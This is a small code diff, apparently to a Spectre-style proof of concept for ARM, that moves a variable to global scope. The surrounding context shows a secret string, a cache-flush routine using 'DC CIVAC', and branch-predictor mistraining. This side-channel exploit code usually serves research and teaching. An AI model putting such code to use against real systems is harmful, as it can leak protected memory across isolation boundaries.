@@ -12,6 +12,7 @@ u_int8_t temp = 0;
 char*secret = "Some Secret Value";
 u_int8_t array[256*4096];
 int thresh = 0;
+u_int8_t s = 0;
 
 static inline void flush(void *addr) {
 	asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
@@ -115,7 +116,6 @@ int main(int argc, const char**argv){
     buffer[i] = i;
   }
   size_t larger_x = (size_t)(secret - (char*)buffer);
-  u_int8_t s;
   //Mistraining the branch predictor using valid values for x
   for(int i = 0; i < 100; i++){
     victim(i);
